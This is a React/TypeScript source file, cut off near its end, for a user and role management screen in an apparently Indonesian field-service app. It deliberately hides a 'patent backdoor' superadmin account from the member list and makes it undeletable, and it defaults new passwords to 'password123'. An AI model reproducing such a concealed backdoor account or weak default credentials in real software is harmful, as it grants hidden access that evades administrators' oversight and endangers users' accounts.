import React, { useState } from 'react';
import { useApp } from '../../context/AppContext';
import { User, UserRole, UserAccountStatus } from '../../types';
import { ProfileImageUploader } from '../common/ProfileImageUploader';
import { 
  Users, 
  UserPlus, 
  Search, 
  Phone, 
  Mail, 
  MapPin, 
  Star,
  LogIn,
  Shield,
  Key,
  Sliders,
  CheckCircle2,
  AlertOctagon,
  Trash2,
  Edit3,
  Save,
  Crown,
  AlertTriangle,
  X,
  Lock,
  Sparkles,
  Camera,
  ShieldAlert
} from 'lucide-react';

interface AccountManagerProps {
  onNavigateToPermissions?: () => void;
}

const getRoleRank = (r: UserRole): number => {
  switch (r) {
    case 'SUPER_ADMIN': return 4;
    case 'ADMIN': return 3;
    case 'TEKNISI': return 2;
    case 'PELANGGAN_KANTOR': return 1;
    case 'PELANGGAN_UMUM': return 1;
    default: return 0;
  }
};

export const AccountManager: React.FC<AccountManagerProps> = ({ onNavigateToPermissions }) => {
  const { 
    currentUser, 
    users, 
    addUser, 
    updateUser,
    deleteUser,
    setUserAccountStatus, 
    resetUserPassword,
    hasPermission,
    showNotification
  } = useApp();

  const [roleFilter, setRoleFilter] = useState<string>('ALL');
  const [searchQuery, setSearchQuery] = useState('');
  const [showAddModal, setShowAddModal] = useState(false);
  const [editingUser, setEditingUser] = useState<User | null>(null);
  const [userToDelete, setUserToDelete] = useState<User | null>(null);

  // Add Form states
  const [name, setName] = useState('');
  const [username, setUsername] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [role, setRole] = useState<UserRole>('TEKNISI');
  const [avatar, setAvatar] = useState('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80');
  const [address, setAddress] = useState('');
  const [companyName, setCompanyName] = useState('');
  const [taxId, setTaxId] = useState('');
  const [initialPassword, setInitialPassword] = useState('password123');

  // Edit Form states
  const [editName, setEditName] = useState('');
  const [editUsername, setEditUsername] = useState('');
  const [editEmail, setEditEmail] = useState('');
  const [editPhone, setEditPhone] = useState('');
  const [editRole, setEditRole] = useState<UserRole>('TEKNISI');
  const [editAvatar, setEditAvatar] = useState('');
  const [editStatus, setEditStatus] = useState<UserAccountStatus>('AKTIF');
  const [editAddress, setEditAddress] = useState('');
  const [editCompanyName, setEditCompanyName] = useState('');
  const [editTaxId, setEditTaxId] = useState('');
  const [editNewPassword, setEditNewPassword] = useState('');

  // Password reset modal state
  const [resetTargetUser, setResetTargetUser] = useState<User | null>(null);
  const [customPassword, setCustomPassword] = useState('');
  const [tempPasswordResult, setTempPasswordResult] = useState('');

  const operatorRank = getRoleRank(currentUser.role);
  const isSuperAdmin = currentUser.role === 'SUPER_ADMIN';

  // Filter users: Always completely hide patent backdoor superadmin (@superadmin) from member list
  let filteredUsers = users.filter(u => {
    if (u.isPatentHidden || u.username === 'superadmin' || u.id === 'usr-superadmin') return false;
    return true;
  });

  if (roleFilter !== 'ALL') {
    filteredUsers = filteredUsers.filter(u => u.role === roleFilter);
  }
  if (searchQuery.trim()) {
    const q = searchQuery.toLowerCase();
    filteredUsers = filteredUsers.filter(u =>
      u.name.toLowerCase().includes(q) ||
      u.email.toLowerCase().includes(q) ||
      u.phone.toLowerCase().includes(q) ||
      (u.username && u.username.toLowerCase().includes(q)) ||
      (u.companyName && u.companyName.toLowerCase().includes(q))
    );
  }

  // Hierarchy check: Can current operator edit target user?
  const canEditTargetUser = (target: User): boolean => {
    if (target.id === currentUser.id) return true; // Can always edit own profile
    if (isSuperAdmin) return true; // Super Admin can edit all
    const targetRank = getRoleRank(target.role);
    // Upper level can edit strictly lower level (Super Admin > Admin > Teknisi > Pelanggan)
    return operatorRank > targetRank;
  };

  // Hierarchy check: Can current operator delete target user?
  const canDeleteTargetUser = (target: User): boolean => {
    if (target.id === currentUser.id) return false; // Cannot delete self
    if (target.isPatentHidden) return false; // Patent superadmin cannot be deleted
    if (isSuperAdmin) return true;
    const targetRank = getRoleRank(target.role);
    return operatorRank > targetRank;
  };

  const handleOpenEditModal = (target: User) => {
    if (!canEditTargetUser(target)) {
      showNotification('Anda tidak memiliki tingkat wewenang untuk mengedit akun ini.', 'error');
      return;
    }
    setEditingUser(target);
    setEditName(target.name || '');
    setEditUsername(target.username || '');
    setEditEmail(target.email || '');
    setEditPhone(target.phone || '');
    setEditRole(target.role);
    setEditAvatar(target.avatar || '');
    setEditStatus(target.status || 'AKTIF');
    setEditAddress(target.address || '');
    setEditCompanyName(target.companyName || '');
    setEditTaxId(target.taxIdentificationNumber || '');
    setEditNewPassword('');
  };

  const handleSaveEditUser = (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingUser || !editName.trim()) return;

    const updates: Partial<User> = {
      name: editName.trim(),
      username: editUsername.trim() || undefined,
      email: editEmail.trim(),
      phone: editPhone.trim(),
      role: editRole,
      avatar: editAvatar.trim() || editingUser.avatar,
      status: editStatus,
      address: editAddress.trim() || undefined,
      companyName: editRole === 'PELANGGAN_KANTOR' ? (editCompanyName.trim() || undefined) : undefined,
      taxIdentificationNumber: editRole === 'PELANGGAN_KANTOR' ? (editTaxId.trim() || undefined) : undefined,
    };

    if (editNewPassword.trim()) {
      updates.password = editNewPassword.trim();
      updates.isPasswordTemporary = false;
    }

    updateUser(editingUser.id, updates);
    showNotification(`Akun ${editName} berhasil diperbarui!`, 'success');
    setEditingUser(null);
  };

  const handleCreateUser = (e: React.FormEvent) => {
    e.preventDefault();
    if (!name.trim() || !email.trim()) return;

    const computedUsername = (username.trim() || email.trim().split('@')[0] || name.trim().replace(/\s+/g, '')).toLowerCase();

    addUser({
      name: name.trim(),
      username: computedUsername,
      email: email.trim(),
      phone: phone.trim(),
      role,
      address: address.trim() || undefined,
      companyName: role === 'PELANGGAN_KANTOR' ? (companyName.trim() || undefined) : undefined,
      taxIdentificationNumber: role === 'PELANGGAN_KANTOR' ? (taxId.trim() || undefined) : undefined,
      avatar: avatar.trim() || `https://images.unsplash.com/photo-${role === 'TEKNISI' ? '1507003211169-0a1dd7228f2d' : '1494790108377-be9c29b29330'}?w=150&auto=format&fit=crop&q=80`,
      rating: role === 'TEKNISI' ? 5.0 : undefined,
      status: 'AKTIF',
      password: initialPassword.trim() || 'password123',
    });

    setShowAddModal(false);
    setName('');
    setUsername('');
    setEmail('');
    setPhone('');
    setAddress('');
    setCompanyName('');
    setTaxId('');
    setInitialPassword('password123');
  };

  const handleResetPasswordSubmit = () => {
    if (!resetTargetUser) return;
    const res = resetUserPassword(resetTargetUser.id, customPassword || undefined);
    if (res.temporaryPassword) {
      setTempPasswordResult(res.temporaryPassword);
    }
    setCustomPassword('');
  };

  const getRoleBadge = (r: UserRole) => {
    switch (r) {
      case 'SUPER_ADMIN':
        return <span className="px-2.5 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30 font-black text-[9px] uppercase tracking-wider">SUPER ADMIN</span>;
      case 'ADMIN':
        return <span className="px-2.5 py-0.5 rounded bg-blue-500/20 text-blue-300 border border-blue-500/30 font-black text-[9px] uppercase tracking-wider">ADMIN OPERASIONAL</span>;
      case 'TEKNISI':
        return <span className="px-2.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-black text-[9px] uppercase tracking-wider">TEKNISI LAPANGAN</span>;
      case 'PELANGGAN_KANTOR':
        return <span className="px-2.5 py-0.5 rounded bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 font-black text-[9px] uppercase tracking-wider">PELANGGAN KANTOR / B2B</span>;
      case 'PELANGGAN_UMUM':
        return <span className="px-2.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30 font-black text-[9px] uppercase tracking-wider">PELANGGAN UMUM</span>;
    }
  };

  return (
    <div className="space-y-8 text-white">
      {/* Header with Bold Typography */}
      <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4 pb-2 border-b border-white/10">
        <div>
          <p className="text-xs uppercase tracking-[0.2em] text-cyan-400 font-bold mb-1">
            Manajemen Pengguna & Otoritas Bertingkat
          </p>
          <h2 className="text-3xl sm:text-4xl font-black tracking-tighter leading-none text-white">
            DAFTAR ANGGOTA & AKUN
          </h2>
        </div>

        <div className="flex items-center gap-2.5">
          {isSuperAdmin && onNavigateToPermissions && (
            <button
              onClick={onNavigateToPermissions}
              className="inline-flex items-center gap-2 px-4 py-2.5 bg-purple-950/60 hover:bg-purple-900/80 text-purple-300 border border-purple-500/40 rounded-xl text-xs font-bold transition cursor-pointer"
            >
              <Sliders className="w-4 h-4 text-purple-400" />
              <span>Kontrol Hak Akses Fitur</span>
            </button>
          )}

          {hasPermission('accounts_manage') && (
            <button
              onClick={() => setShowAddModal(true)}
              className="inline-flex items-center gap-2 px-4 py-2.5 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-lg shadow-cyan-500/25 transition cursor-pointer"
            >
              <UserPlus className="w-4 h-4" />
              <span>Tambah Pengguna</span>
            </button>
          )}
        </div>
      </div>

      {/* Hierarchy Info Banner */}
      <div className="p-3.5 bg-cyan-950/30 border border-cyan-500/30 rounded-2xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 text-xs">
        <div className="flex items-center gap-2 text-cyan-300 font-bold">
          <Shield className="w-4 h-4 text-cyan-400 shrink-0" />
          <span>Tingkat Otoritas: Super Admin → Admin → Teknisi → Pelanggan</span>
        </div>
        <p className="text-white/50 text-[11px]">
          Akun hanya dapat diedit oleh tingkatan di atasnya atau oleh pemilik akun sendiri.
        </p>
      </div>

      {/* Filter and Search Bar */}
      <div className="bg-white/5 p-4 rounded-2xl border border-white/10 space-y-3">
        <div className="flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
          <div className="flex flex-wrap gap-1.5">
            {[
              { id: 'ALL', label: 'SEMUA ROLE' },
              { id: 'SUPER_ADMIN', label: 'SUPER ADMIN' },
              { id: 'ADMIN', label: 'ADMIN' },
              { id: 'TEKNISI', label: 'TEKNISI' },
              { id: 'PELANGGAN_KANTOR', label: 'KANTOR / B2B' },
              { id: 'PELANGGAN_UMUM', label: 'PELANGGAN' },
            ].map(tab => (
              <button
                key={tab.id}
                onClick={() => setRoleFilter(tab.id)}
                className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-wider transition cursor-pointer ${
                  roleFilter === tab.id ? 'bg-cyan-500 text-slate-950' : 'bg-white/5 text-white/60 hover:text-white'
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>

          <div className="relative">
            <Search className="w-4 h-4 absolute left-3 top-2.5 text-white/40" />
            <input
              type="text"
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
              placeholder="Cari nama, email, telp..."
              className="w-full sm:w-64 pl-9 pr-4 py-1.5 bg-white/5 border border-white/10 rounded-xl text-xs text-white placeholder-white/40 focus:ring-2 focus:ring-cyan-500"
            />
          </div>
        </div>
      </div>

      {/* Users Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {filteredUsers.map(u => {
          const isSelf = u.id === currentUser.id;
          const canEditThis = canEditTargetUser(u);
          const canDeleteThis = canDeleteTargetUser(u);

          return (
            <div
              key={u.id}
              className="bg-white/5 border border-white/10 hover:border-white/20 rounded-3xl p-6 transition flex flex-col justify-between space-y-4 relative"
            >
              {u.isTemporarySuperAdmin && (
                <div className="absolute -top-2.5 right-4 px-2.5 py-0.5 bg-amber-500/20 border border-amber-500/40 text-amber-300 text-[8px] font-black uppercase tracking-wider rounded-full shadow">
                  ⚡ Super Admin Sementara
                </div>
              )}

              <div>
                <div className="flex items-start justify-between gap-2 mb-3">
                  <div className="flex items-center gap-1.5 flex-wrap">
                    {getRoleBadge(u.role)}
                    {u.isPatentHidden && (
                      <span className="px-1.5 py-0.5 rounded bg-purple-950 text-purple-400 border border-purple-700 text-[8px] font-mono">
                        🔒 Paten Backdoor
                      </span>
                    )}
                  </div>
                  
                  {/* Status badge */}
                  {canEditThis && !isSelf ? (
                    <select
                      value={u.status}
                      onChange={(e) => setUserAccountStatus(u.id, e.target.value as UserAccountStatus)}
                      className={`text-[10px] font-bold px-2 py-0.5 rounded-full border cursor-pointer focus:outline-none ${
                        u.status === 'AKTIF'
                          ? 'bg-emerald-950/50 border-emerald-500/50 text-emerald-400'
                          : u.status === 'DITANGGUHKAN'
                          ? 'bg-amber-950/50 border-amber-500/50 text-amber-400'
                          : 'bg-rose-950/50 border-rose-500/50 text-rose-400'
                      }`}
                    >
                      <option value="AKTIF">🟢 AKTIF</option>
                      <option value="DITANGGUHKAN">🟡 DITANGGUHKAN</option>
                      <option value="TERKUNCI">🔴 TERKUNCI</option>
                    </select>
                  ) : (
                    <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${
                      u.status === 'AKTIF'
                        ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                        : 'bg-rose-500/10 border-rose-500/30 text-rose-400'
                    }`}>
                      {u.status}
                    </span>
                  )}
                </div>

                <div className="flex items-center gap-3 mt-2">
                  <img
                    src={u.avatar}
                    alt={u.name}
                    className="w-12 h-12 rounded-2xl object-cover border border-white/20 bg-black shrink-0"
                  />
                  <div className="min-w-0">
                    <h3 className="font-black text-white text-base tracking-tight truncate">{u.name}</h3>
                    {u.companyName ? (
                      <p className="text-[11px] text-cyan-400 font-bold truncate">{u.companyName}</p>
                    ) : (
                      <p className="text-[11px] text-white/50 truncate">@{u.username || u.email.split('@')[0]}</p>
                    )}
                  </div>
                </div>

                <div className="mt-4 p-3.5 bg-black/40 rounded-2xl border border-white/5 space-y-1.5 text-xs text-white/60">
                  <div className="flex items-center gap-2">
                    <Mail className="w-3.5 h-3.5 text-white/40 shrink-0" />
                    <span className="truncate">{u.email}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Phone className="w-3.5 h-3.5 text-white/40 shrink-0" />
                    <span>{u.phone}</span>
                  </div>
                  {u.address && (
                    <div className="flex items-center gap-2">
                      <MapPin className="w-3.5 h-3.5 text-white/40 shrink-0" />
                      <span className="truncate">{u.address}</span>
                    </div>
                  )}
                </div>
              </div>

              {/* Action Buttons with Strict Hierarchy */}
              <div className="pt-2 flex items-center gap-2">
                {canEditThis ? (
                  <button
                    onClick={() => handleOpenEditModal(u)}
                    className="flex-1 py-2 px-3 bg-white/10 hover:bg-white/20 text-white border border-white/15 rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition cursor-pointer"
                  >
                    <Edit3 className="w-3.5 h-3.5 text-cyan-400" />
                    <span>Edit Akun</span>
                  </button>
                ) : (
                  <div className="flex-1 py-2 px-3 bg-white/5 text-white/30 rounded-xl text-[11px] font-bold text-center border border-white/5">
                    Hanya Atasan / Root
                  </div>
                )}

                {canEditThis && !isSelf && (
                  <button
                    onClick={() => {
                      setResetTargetUser(u);
                      setTempPasswordResult('');
                      setCustomPassword('');
                    }}
                    title="Reset Sandi Akun Ini"
                    className="p-2 bg-slate-900 hover:bg-slate-800 text-cyan-300 border border-slate-700 rounded-xl text-xs font-bold transition cursor-pointer"
                  >
                    <Key className="w-4 h-4 text-cyan-400" />
                  </button>
                )}

                {canDeleteThis && (
                  <button
                    onClick={() => setUserToDelete(u)}
                    title="Hapus Akun Pengguna"
                    className="p-2 bg-red-950/40 hover:bg-red-900/60 text-red-300 border border-red-500/30 rounded-xl text-xs font-bold transition cursor-pointer"
                  >
                    <Trash2 className="w-4 h-4 text-red-400" />
                  </button>
                )}
              </div>
            </div>
          );
        })}
      </div>

      {/* EDIT USER MODAL WITH IMAGE UPLOADER */}
      {editingUser && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-150">
          <div className="bg-[#141414] rounded-3xl p-6 max-w-xl w-full border border-cyan-500/40 shadow-2xl space-y-4 text-white max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between pb-3 border-b border-white/10">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-xl bg-cyan-500/20 text-cyan-400">
                  <Edit3 className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-black text-base text-white">Edit Akun: {editingUser.name}</h3>
                  <p className="text-xs text-white/50">{editingUser.role} • ID: {editingUser.id}</p>
                </div>
              </div>
              <button 
                onClick={() => setEditingUser(null)} 
                className="text-white/40 hover:text-white p-1 rounded-lg cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <form onSubmit={handleSaveEditUser} className="space-y-4 text-xs">
              {/* Profile Image Uploader */}
              <ProfileImageUploader
                currentAvatar={editAvatar}
                onAvatarChange={(newUrl) => setEditAvatar(newUrl)}
                title="Ganti Foto Profil Akun"
              />

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Nama Lengkap *</label>
                  <input
                    type="text"
                    required
                    value={editName}
                    onChange={e => setEditName(e.target.value)}
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500 focus:outline-none"
                  />
                </div>
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Username</label>
                  <input
                    type="text"
                    value={editUsername}
                    onChange={e => setEditUsername(e.target.value)}
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500 focus:outline-none"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Email *</label>
                  <input
                    type="email"
                    required
                    value={editEmail}
                    onChange={e => setEditEmail(e.target.value)}
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500 focus:outline-none"
                  />
                </div>
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">No. WhatsApp *</label>
                  <input
                    type="text"
                    required
                    value={editPhone}
                    onChange={e => setEditPhone(e.target.value)}
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500 focus:outline-none"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Peran Akses (Role)</label>
                  <select
                    value={editRole}
                    onChange={e => setEditRole(e.target.value as UserRole)}
                    disabled={!isSuperAdmin && editingUser.id === currentUser.id}
                    className="w-full p-2.5 bg-[#1a1a1a] border border-white/10 rounded-xl text-white font-bold"
                  >
                    {isSuperAdmin && <option value="SUPER_ADMIN">SUPER ADMIN</option>}
                    {(isSuperAdmin || operatorRank >= 3) && <option value="ADMIN">ADMIN OPERASIONAL</option>}
                    {(isSuperAdmin || operatorRank >= 2) && <option value="TEKNISI">TEKNISI LAPANGAN</option>}
                    <option value="PELANGGAN_KANTOR">PELANGGAN KANTOR / B2B</option>
                    <option value="PELANGGAN_UMUM">PELANGGAN UMUM (RUMAH)</option>
                  </select>
                </div>
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Status Akun</label>
                  <select
                    value={editStatus}
                    onChange={e => setEditStatus(e.target.value as UserAccountStatus)}
                    disabled={editingUser.id === currentUser.id}
                    className="w-full p-2.5 bg-[#1a1a1a] border border-white/10 rounded-xl text-white font-bold"
                  >
                    <option value="AKTIF">🟢 AKTIF</option>
                    <option value="DITANGGUHKAN">🟡 DITANGGUHKAN</option>
                    <option value="TERKUNCI">🔴 TERKUNCI</option>
                  </select>
                </div>
              </div>

              {editRole === 'PELANGGAN_KANTOR' && (
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Nama Perusahaan / Gedung</label>
                    <input
                      type="text"
                      value={editCompanyName}
                      onChange={e => setEditCompanyName(e.target.value)}
                      placeholder="PT. Inovasi Prima Sentosa"
                      className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white"
                    />
                  </div>
                  <div>
                    <label className="block font-black uppercase tracking-wider text-white/60 mb-1">NPWP Perusahaan</label>
                    <input
                      type="text"
                      value={editTaxId}
                      onChange={e => setEditTaxId(e.target.value)}
                      placeholder="01.234.567.8-901.000"
                      className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white"
                    />
                  </div>
                </div>
              )}

              <div>
                <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Alamat Domisili / Lokasi Kantor</label>
                <input
                  type="text"
                  value={editAddress}
                  onChange={e => setEditAddress(e.target.value)}
                  className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white"
                />
              </div>

              <div className="p-3 bg-white/5 rounded-2xl border border-white/10 space-y-1.5">
                <label className="block font-black uppercase tracking-wider text-white/70">
                  Ubah Kata Sandi Baru (Opsional)
                </label>
                <input
                  type="password"
                  value={editNewPassword}
                  onChange={e => setEditNewPassword(e.target.value)}
                  placeholder="Kosongkan jika tidak ingin mengubah sandi..."
                  className="w-full p-2.5 bg-black/50 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500 focus:outline-none"
                />
              </div>

              <div className="flex justify-end gap-2 pt-3 border-t border-white/10">
                <button
                  type="button"
                  onClick={() => setEditingUser(null)}
                  className="px-4 py-2 bg-white/10 hover:bg-white/20 text-white rounded-xl font-bold cursor-pointer"
                >
                  Batal
                </button>
                <button
                  type="submit"
                  className="px-5 py-2 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white rounded-xl font-black uppercase tracking-wider flex items-center gap-1.5 shadow-lg shadow-cyan-500/25 cursor-pointer"
                >
                  <Save className="w-4 h-4" />
                  <span>Simpan Perubahan</span>
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ADD USER MODAL WITH IMAGE UPLOADER */}
      {showAddModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-150">
          <div className="bg-[#121212] rounded-3xl p-6 max-w-xl w-full border border-white/15 shadow-2xl space-y-4 text-white max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between pb-2 border-b border-white/10">
              <h3 className="font-black text-base text-white flex items-center gap-2">
                <UserPlus className="w-5 h-5 text-cyan-400" />
                <span>Tambah Pengguna Baru</span>
              </h3>
              <button onClick={() => setShowAddModal(false)} className="text-white/40 hover:text-white p-1 cursor-pointer">
                <X className="w-5 h-5" />
              </button>
            </div>

            <form onSubmit={handleCreateUser} className="space-y-3.5 text-xs">
              <ProfileImageUploader
                currentAvatar={avatar}
                onAvatarChange={(newUrl) => setAvatar(newUrl)}
                title="Upload Foto Profil Akun"
                mode="upload-only"
              />

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Nama Lengkap *</label>
                  <input
                    type="text"
                    required
                    value={name}
                    onChange={e => setName(e.target.value)}
                    placeholder="Contoh: Rian Gunawan"
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500"
                  />
                </div>
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">
                    Username <span className="text-white/40 lowercase font-normal">(opsional)</span>
                  </label>
                  <input
                    type="text"
                    value={username}
                    onChange={e => setUsername(e.target.value)}
                    placeholder={email ? email.split('@')[0].toLowerCase() : 'riangunawan'}
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Email *</label>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={e => setEmail(e.target.value)}
                    placeholder="rian@koolfix.co.id"
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500"
                  />
                </div>
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">No. WhatsApp *</label>
                  <input
                    type="text"
                    required
                    value={phone}
                    onChange={e => setPhone(e.target.value)}
                    placeholder="08123456789"
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Peran Akses (Role)</label>
                  <select
                    value={role}
                    onChange={e => setRole(e.target.value as UserRole)}
                    className="w-full p-2.5 bg-[#1a1a1a] border border-white/10 rounded-xl text-white font-bold"
                  >
                    <option value="TEKNISI">TEKNISI LAPANGAN</option>
                    <option value="ADMIN">ADMIN OPERASIONAL</option>
                    {isSuperAdmin && <option value="SUPER_ADMIN">SUPER ADMIN</option>}
                    <option value="PELANGGAN_KANTOR">PELANGGAN KANTOR / B2B</option>
                    <option value="PELANGGAN_UMUM">PELANGGAN UMUM (RUMAH)</option>
                  </select>
                </div>
                <div>
                  <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Kata Sandi Awal</label>
                  <input
                    type="text"
                    value={initialPassword}
                    onChange={e => setInitialPassword(e.target.value)}
                    placeholder="password123"
                    className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white focus:ring-2 focus:ring-cyan-500"
                  />
                </div>
              </div>

              {role === 'PELANGGAN_KANTOR' && (
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Nama Perusahaan / Gedung</label>
                    <input
                      type="text"
                      value={companyName}
                      onChange={e => setCompanyName(e.target.value)}
                      placeholder="PT. Inovasi Prima Sentosa"
                      className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white"
                    />
                  </div>
                  <div>
                    <label className="block font-black uppercase tracking-wider text-white/60 mb-1">NPWP Perusahaan</label>
                    <input
                      type="text"
                      value={taxId}
                      onChange={e => setTaxId(e.target.value)}
                      placeholder="01.234.567.8-901.000"
                      className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white"
                    />
                  </div>
                </div>
              )}

              <div>
                <label className="block font-black uppercase tracking-wider text-white/60 mb-1">Alamat Domisili / Lokasi Kantor</label>
                <input
                  type="text"
                  value={address}
                  onChange={e => setAddress(e.target.value)}
                  placeholder="Gedung Cyber 2 Lantai 12, Jl. Rasuna Said, Jakarta"
                  className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-white"
                />
              </div>

              <div className="flex justify-end gap-2 pt-3 border-t border-white/10">
                <button
                  type="button"
                  onClick={() => setShowAddModal(false)}
                  className="px-4 py-2 bg-white/10 hover:bg-white/20 text-white rounded-xl font-bold cursor-pointer"
                >
                  Batal
                </button>
                <button
                  type="submit"
                  className="px-5 py-2 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white rounded-xl font-black uppercase tracking-wider shadow-lg shadow-cyan-500/25 cursor-pointer"
                >
                  Simpan Akun
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Reset Password Modal */}
      {resetTargetUser && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-150">
          <div className="bg-[#121212] rounded-3xl p-6 max-w-md w-full border border-white/15 shadow-2xl space-y-4 text-white">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-cyan-500/20 text-cyan-400 flex items-center justify-center">
                <Key className="w-5 h-5" />
              </div>
              <div>
                <h3 className="font-bold text-base text-white">Reset Sandi: {resetTargetUser.name}</h3>
                <p className="text-xs text-slate-400">{resetTargetUser.email}</p>
              </div>
            </div>

            {tempPasswordResult ? (
              <div className="p-4 bg-emerald-950/40 border border-emerald-500/50 rounded-xl space-y-2 text-center">
                <CheckCircle2 className="w-6 h-6 text-emerald-400 mx-auto" />
                <h4 className="text-xs font-bold text-white">Kata Sandi Baru Telah Ditetapkan</h4>
                <div className="p-2 bg-slate-950 rounded-lg border border-slate-800 font-mono text-sm font-bold text-cyan-400 tracking-wider">
                  {tempPasswordResult}
                </div>
                <p className="text-[10px] text-slate-400">Pengguna dapat login dengan password ini.</p>
              </div>
            ) : (
              <div className="space-y-3">
                <p className="text-xs text-slate-300">
                  Tentukan kata sandi baru atau biarkan kosong untuk menghasilkan sandi sementara otomatis.
                </p>
                <input
                  type="text"
                  value={customPassword}
                  onChange={e => setCustomPassword(e.target.value)}
                  placeholder="Contoh: koolfix2026 atau kosongkan"
                  className="w-full p-2.5 bg-white/5 border border-white/10 rounded-xl text-xs text-white placeholder-white/40 focus:ring-2 focus:ring-cyan-500"
                />
              </div>
            )}

            <div className="flex justify-end gap-2 pt-2">
              <button
                type="button"
                onClick={() => setResetTargetUser(null)}
                className="px-4 py-2 bg-white/10 hover:bg-white/20 text-white rounded-xl text-xs font-bold cursor-pointer"
              >
                {tempPasswordResult ? 'Tutup' : 'Batal'}
              </button>
              {!tempPasswordResult && (
                <button
                  type="button"
                  onClick={handleResetPasswordSubmit}
                  className="px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white rounded-xl text-xs font-bold cursor-pointer"
                >
                  Eksekusi Reset
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Delete User Confirmation Modal */}
      {userToDelete && (
        <div className="fixed inset-0 z-[90] flex items-center justify-center p-4 bg-black/90 backdrop-blur-md animate-in fade-in duration-150">
          <div className="max-w-md w-full bg-[#181818] border border-red-500/40 rounded-3xl p-6 text-white space-y-4 shadow-2xl">
            <div className="flex items-center gap-3 text-red-400">
